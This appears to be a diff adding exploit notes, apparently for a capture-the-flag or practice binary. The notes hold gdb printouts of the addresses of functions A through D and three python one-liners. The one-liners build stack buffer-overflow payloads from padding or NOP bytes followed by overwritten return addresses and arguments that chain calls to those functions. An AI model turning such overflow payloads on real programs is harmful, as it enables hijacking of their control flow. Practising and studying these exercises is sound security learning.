@@ -1,0 +1,19 @@
+(gdb) print A
+$1 = {<text variable, no debug info>} 0x8048400 <A>
+(gdb) print B
+$2 = {<text variable, no debug info>} 0x8048414 <B>
+(gdb) print C
+$3 = {<text variable, no debug info>} 0x8048428 <C>
+(gdb) print D
+$4 = {<text variable, no debug info>} 0x804843c <D>
+
+
+`python -c 'print "A"*128 + "BBBB" + "\x14\x84\x04\x08" + "\x28\x84\x04\x08"  + "AAAA" + "AAAA" '`
+
+
+
+ set args `python -c 'print "A"*132 + "\x14\x84\x04\x08" + "\x14\x84\x04\x08" + "\x01\x01\x01\x01" + "\x01\x01\x01\x01" + "\x02\x02\x02\x02" + "\x02\x02\x02\x02" '`
+
+
+
+ set args `python -c 'print "\x90"*132 + "\x14\x84\x04\x08" + "\x14\x84\x04\x08" + "\x11\x11\x11\x11" + "\x11\x11\x11\x11" + "\x22\x22\x22\x22" + "\x22\x22\x22\x22" '`
